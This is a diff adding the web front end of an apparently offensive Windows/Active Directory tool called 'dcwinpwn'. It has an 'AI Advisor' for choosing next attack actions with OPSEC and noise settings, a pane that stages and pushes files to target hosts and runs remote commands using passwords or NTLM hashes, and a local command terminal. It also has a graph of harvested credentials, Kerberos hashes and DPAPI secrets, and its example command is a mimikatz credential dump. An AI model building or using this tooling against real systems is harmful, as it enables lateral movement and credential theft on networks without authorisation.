@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <title>dcwinpwn Graph</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+
+  <style>
+    :root { --bg:#0b0b0b; --panel:#111; --text:#ddd; --muted:#999; --accent:#66c2ff; --border:#333; }
+    html,body{height:100%;margin:0;background:var(--bg);color:var(--text);
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
+    #app{position:absolute;inset:0}
+    #legend{position:fixed;left:10px;bottom:10px;padding:8px 10px;background:var(--panel);
+      border:1px solid var(--border);border-radius:8px;font-size:12px;max-width:28rem;max-height:40vh;overflow:auto}
+    .panel{position:fixed;right:10px;background:var(--panel);color:var(--text);padding:10px;border-radius:8px;border:1px solid var(--border);font-size:12px;opacity:.98}
+    #coach{top:10px;width:360px}
+    #termPane{bottom:10px;width:540px}
+    #opsPane{bottom:10px;right:560px;width:460px}
+    button{cursor:pointer;border:1px solid var(--border);background:#171717;color:var(--text);padding:6px 10px;border-radius:6px}
+    button:hover{border-color:var(--accent)}
+    input,textarea,select{background:#141414;color:var(--text);border:1px solid var(--border);border-radius:6px;padding:4px 6px}
+    textarea{resize:vertical}
+    .muted{color:var(--muted)}
+    .mono{font-family:inherit}
+    pre{background:#0f0f0f;border:1px solid var(--border);padding:8px;border-radius:6px}
+    a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+  </style>
+
+  <!-- LOKAL GoJS (ingen CDN) + cache-buster -->
+  <script defer src="/vendor/go.js?v=2"></script>
+  <!-- Extension laddas dynamiskt i skriptet; den här raden är kvar som fallback & cache-bust -->
+  <script defer src="/vendor/VirtualizedPackedLayout.js?v=2"></script>
+</head>
+<body>
+  <div id="app"></div>
+
+  <div id="legend">
+    <b>Loading…</b>
+    <div class="muted">API måste vara på <code>http://127.0.0.1:8000</code>. UI kan ligga på 8080.</div>
+  </div>
+
+  <div id="coach" class="panel">
+    <div style="font-weight:bold;margin-bottom:6px">AI Advisor</div>
+    <div>
+      <label>OPSEC
+        <select id="opsec">
+          <option>read-only</option><option selected>low</option><option>medium</option><option>high</option>
+        </select>
+      </label>
+      <label style="margin-left:8px">Noise
+        <input id="noise" type="range" min="0" max="1" step="0.05" value="0.3">
+      </label>
+      <button id="advBtn" style="float:right">Get advice</button>
+    </div>
+    <div id="advice" style="margin-top:10px;white-space:pre-wrap"></div>
+    <div class="muted" style="margin-top:8px">API_BASE: <code id="apiBaseEcho" class="mono"></code></div>
+  </div>
+
+  <div id="opsPane" class="panel">
+    <div style="font-weight:bold;margin-bottom:6px">Ops (Upload → Push → Remote Exec)</div>
+    <div>Stage file: <input type="file" id="upFile"><button id="btnStage">Stage</button></div>
+    <div style="margin-top:6px">
+      Target: <input id="opsTarget" placeholder="HOST/IP" style="width:120px">
+      Remote path: <input id="opsRemote" placeholder="C:\\Windows\\Temp\\tool.exe" style="width:240px">
+    </div>
+    <div style="margin-top:6px">
+      Domain <input id="opsDom" style="width:100px">
+      User <input id="opsUser" style="width:110px">
+      Pass <input id="opsPass" type="password" style="width:140px">
+      or NTLM <input id="opsNTLM" style="width:190px">
+    </div>
+    <div style="margin-top:6px">
+      <button id="btnPush">Push</button>
+      Command: <input id="opsCmd" style="width:240px" placeholder="C:\\Windows\\Temp\\mimikatz.exe sekurlsa::logonpasswords exit">
+      <button id="btnRexec">Run</button>
+    </div>
+    <pre id="opsOut" style="max-height:200px;overflow:auto;margin-top:6px;"></pre>
+  </div>
+
+  <div id="termPane" class="panel">
+    <div style="font-weight:bold;margin-bottom:6px">Terminal (Local Orchestrator)</div>
+    <textarea id="termCmd" rows="3" style="width:100%;" placeholder="whoami && id"></textarea>
+    <div style="margin-top:6px">
+      <button id="runTerm">Run</button>
+      <label style="margin-left:8px">Timeout
+        <input id="termTimeout" type="number" value="600" min="1" style="width:90px">
+      </label>
+    </div>
+    <pre id="termOut" style="max-height:220px;overflow:auto;margin-top:6px;"></pre>
+  </div>
+
+  <script type="module">
+    // ====== HÅRDKODAD API-BASE (ingen mer 404 mot 8080) ======
+    const API_BASE = 'http://127.0.0.1:8000';
+    const apiUrl = (p) => API_BASE.replace(/\/+$/,'') + p;
+    document.getElementById('apiBaseEcho')?.replaceChildren(document.createTextNode(API_BASE));
+
+    // fetch helper med timeout + robust JSON/text
+    async function apiFetch(path, opts = {}, timeoutMs = 3000) {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort('timeout'), timeoutMs);
+      try {
+        const r = await fetch(apiUrl(path), { ...opts, signal: ctrl.signal });
+        if (!r.ok) throw new Error(`HTTP ${r.status}`);
+        const ct = (r.headers.get('content-type') || '').toLowerCase();
+        return ct.includes('application/json') ? r.json() : r.text();
+      } finally { clearTimeout(t); }
+    }
+
+    // ====== Bind UI-handlers direkt (oavsett GoJS-status) ======
+    document.getElementById('advBtn').onclick = async () => {
+      const opsec = document.getElementById('opsec').value;
+      const noise = parseFloat(document.getElementById('noise').value);
+      const adviceEl = document.getElementById('advice');
+      adviceEl.textContent = 'Querying advisor…';
+      try {
+        const j = await apiFetch('/advisor/next_actions', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ opsec, noise_budget: noise, target: {} })
+        });
+        adviceEl.textContent =
+          'Suggested action: ' + (j.suggested_action || '(none)') +
+          '\nTop ports: ' + ((j.top_ports || []).join(', ') || '(none)');
+      } catch (e) {
+        adviceEl.textContent = 'Advisor error: ' + e.message;
+        console.error(e);
+      }
+    };
+
+    document.getElementById('runTerm').onclick = async () => {
+      const cmd = document.getElementById('termCmd').value;
+      const timeout = parseInt(document.getElementById('termTimeout').value || '600', 10);
+      const out = document.getElementById('termOut');
+      out.textContent = 'Running…';
+      try {
+        const j = await apiFetch('/terminal/exec', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ cmd, timeout })
+        }, /*timeout*/ 60000);
+        out.textContent = (j.stdout||'') + (j.stderr ? ('\n[stderr]\n'+j.stderr) : '') || '(no output)';
+        try { localStorage.setItem('dcw_last_cmd', cmd); } catch(_) {}
+      } catch (e) {
+        out.textContent = 'Terminal error: ' + e.message;
+        console.error(e);
+      }
+    };
+    try { const lc = localStorage.getItem('dcw_last_cmd'); if (lc) document.getElementById('termCmd').value = lc; } catch(_) {}
+
+    let stagedPath = null;
+    document.getElementById('btnStage').onclick = async () => {
+      const f = document.getElementById('upFile').files[0];
+      const out = document.getElementById('opsOut');
+      if (!f) { out.textContent = 'Select a file first.'; return; }
+      out.textContent = 'Uploading…';
+      try {
+        const fd = new FormData(); fd.append('file', f);
+        const r = await fetch(apiUrl('/ops/stage'), { method:'POST', body: fd });
+        if (!r.ok) throw new Error('HTTP '+r.status);
+        const j = await r.json();
+        stagedPath = j.path;
+        out.textContent = 'Staged: ' + stagedPath;
+      } catch (e) {
+        out.textContent = 'Stage error: ' + e.message;
+        console.error(e);
+      }
+    };
+
+    document.getElementById('btnPush').onclick = async () => {
+      const out = document.getElementById('opsOut');
+      if (!stagedPath) { out.textContent = 'No staged file.'; return; }
+      const fd = new FormData();
+      fd.append('target', document.getElementById('opsTarget').value);
+      fd.append('local_path', stagedPath);
+      fd.append('remote_path', document.getElementById('opsRemote').value);
+      fd.append('domain', document.getElementById('opsDom').value);
+      fd.append('user', document.getElementById('opsUser').value);
+      fd.append('password', document.getElementById('opsPass').value);
+      fd.append('ntlm_hash', document.getElementById('opsNTLM').value);
+      out.textContent = 'Pushing…';
+      try {
+        const r = await fetch(apiUrl('/ops/push'), { method:'POST', body: fd });
+        if (!r.ok) throw new Error('HTTP '+r.status);
+        const j = await r.json();
+        out.textContent = (j.stdout||'') + (j.stderr ? ('\n[stderr]\n'+j.stderr) : '');
+      } catch (e) {
+        out.textContent = 'Push error: ' + e.message;
+        console.error(e);
+      }
+    };
+
+    document.getElementById('btnRexec').onclick = async () => {
+      const out = document.getElementById('opsOut');
+      const fd = new FormData();
+      fd.append('target', document.getElementById('opsTarget').value);
+      fd.append('command', document.getElementById('opsCmd').value);
+      fd.append('domain', document.getElementById('opsDom').value);
+      fd.append('user', document.getElementById('opsUser').value);
+      fd.append('password', document.getElementById('opsPass').value);
+      fd.append('ntlm_hash', document.getElementById('opsNTLM').value);
+      out.textContent = 'Executing…';
+      try {
+        const r = await fetch(apiUrl('/ops/rexec'), { method:'POST', body: fd });
+        if (!r.ok) throw new Error('HTTP '+r.status);
+        const j = await r.json();
+        out.textContent = (j.stdout||'') + (j.stderr ? ('\n[stderr]\n'+j.stderr) : '');
+      } catch (e) {
+        out.textContent = 'Exec error: ' + e.message;
+        console.error(e);
+      }
+    };
+
+    // ====== GoJS: vänta in lib, ladda extension, bygg graf ======
+    function waitForGo(timeoutMs = 8000) {
+      const t0 = performance.now();
+      return new Promise((resolve, reject) => {
+        (function check(){
+          if (window.go && window.go.GraphObject && window.go.Diagram) return resolve(window.go);
+          if (performance.now() - t0 > timeoutMs) return reject(new Error('GoJS not loaded'));
+          setTimeout(check, 25);
+        })();
+      });
+    }
+
+    async function loadPackedExt(timeoutMs = 3000) {
+      if (window.VirtualizedPackedLayout) return true;
+      await waitForGo();
+      return new Promise((resolve) => {
+        const s = document.createElement('script');
+        s.src = '/vendor/VirtualizedPackedLayout.js?v=2';
+        s.onload = () => resolve(!!window.VirtualizedPackedLayout);
+        s.onerror = () => resolve(false);
+        document.head.appendChild(s);
+        setTimeout(() => resolve(!!window.VirtualizedPackedLayout), timeoutMs);
+      });
+    }
+
+    const legendEl = document.getElementById("legend");
+    function renderLegend(n, e, packedOk) {
+      const types = ["HOST","DNSRecord","USER","Credential","KerbHash","VULN","Service","Port","OS","ScriptOutput","CVE","Template","CA","Share","DPAPISecret","Hash","CoercionAttempt","Opportunity","AzureGraph"];
+      legendEl.innerHTML =
+        `<b>Types</b><br/>${types.sort().map(t=>`• ${t}`).join("<br/>")}` +
+        `<br/><small>${n} nodes, ${e} edges</small>` +
+        (packedOk ? '' : `<div class="muted" style="margin-top:6px">Using ForceDirected fallback</div>`);
+    }
+    renderLegend(0, 0, false);
+
+    (async () => {
+      let packedOk = false;
+      try { packedOk = await loadPackedExt(); } catch(_) {}
+      try {
+        const go = await waitForGo();
+        const $ = go.GraphObject.make;
+        const LayoutCtor = (packedOk && window.VirtualizedPackedLayout) ? window.VirtualizedPackedLayout : go.ForceDirectedLayout;
+
+        const diagram = $(go.Diagram, "app", {
+          initialAutoScale: go.Diagram.Uniform,
+          layout: new LayoutCtor(packedOk ? { spacing: 8 } : { defaultSpringLength: 60 }),
+          "toolManager.mouseWheelBehavior": go.ToolManager.WheelZoom,
+          "animationManager.isEnabled": false,
+          "undoManager.isEnabled": false
+        });
+
+        const typeShape = {
+          "HOST":"RoundedRectangle","DNSRecord":"Ellipse","USER":"RoundedRectangle","Credential":"Hexagon",
+          "KerbHash":"Triangle","VULN":"Octagon","Service":"Parallelogram1","Port":"Parallelogram2","OS":"RoundedRectangle",
+          "ScriptOutput":"Cloud","CVE":"Diamond","Template":"Diamond","CA":"Diamond","Share":"File",
+          "DPAPISecret":"Hexagon","Hash":"Hexagon","CoercionAttempt":"Hexagon","Opportunity":"Diamond","AzureGraph":"Circle"
+        };
+
+        diagram.nodeTemplate =
+          $(go.Node, "Auto",
+            new go.Binding("location", "loc", go.Point.parse).makeTwoWay(go.Point.stringify),
+            $(go.Shape,
+              new go.Binding("figure","type", t => typeShape[t] || "RoundedRectangle"),
+              { fill: "#1c1c1c", stroke: "#444" }),
+            $(go.TextBlock, { margin: 6, maxSize: new go.Size(260, NaN), wrap: go.TextBlock.WrapFit, stroke: "#ddd", font: "12px ui-monospace" },
+              new go.Binding("text","", n => {
+                const id = String(n.id||"");
+                return `${n.type||"NODE"}\n${id.length>28 ? id.slice(0,12)+'…'+id.slice(-12) : id}`;
+              }))
+          );
+
+        diagram.linkTemplate =
+          $(go.Link, { routing: go.Link.Normal, curve: go.Link.Bezier },
+            $(go.Shape, { strokeWidth: 1.0, stroke: "#666" }),
+            $(go.Shape, { toArrow: "Standard", fill: "#666", stroke: null }),
+            $(go.TextBlock, { segmentOffset: new go.Point(0, -10), font: "10px ui-monospace", stroke: "#bbb" },
+              new go.Binding("text", "type"))
+          );
+
+        // tom modell först
+        diagram.model = new go.GraphLinksModel([], []);
+
+        // ladda grafdata i bakgrunden
+        try {
+          const res = await apiFetch('/graph/json'); // 3s timeout
+          const graph = (typeof res === 'string') ? JSON.parse(res) : (res || {nodes:[],edges:[]});
+          const nodes = (graph.nodes || []).map(n => ({ key: n.id, ...n }));
+          const links = (graph.edges || []).map(e => ({ from: e.src, to: e.dst, type: e.type }));
+          diagram.model = new go.GraphLinksModel(nodes, links);
+          renderLegend(nodes.length, links.length, packedOk);
+        } catch (e) {
+          console.warn('Graph load failed:', e);
+          legendEl.innerHTML =
+            `<b>API not reachable at ${API_BASE}</b><br>` +
+            `<span class="muted">Starta: uvicorn api.main:app --host 0.0.0.0 --port 8000</span>`;
+        }
+      } catch (e) {
+        console.error('GoJS init failed:', e);
+        legendEl.innerHTML =
+          `<b>GoJS failed to load</b><br><span class="muted">${e.message}</span><br>` +
+          `<span class="muted">Kontrollera att <code>/vendor/go.js</code> finns och laddas.</span>`;
+      }
+    })();
+  </script>
+</body>
+</html>
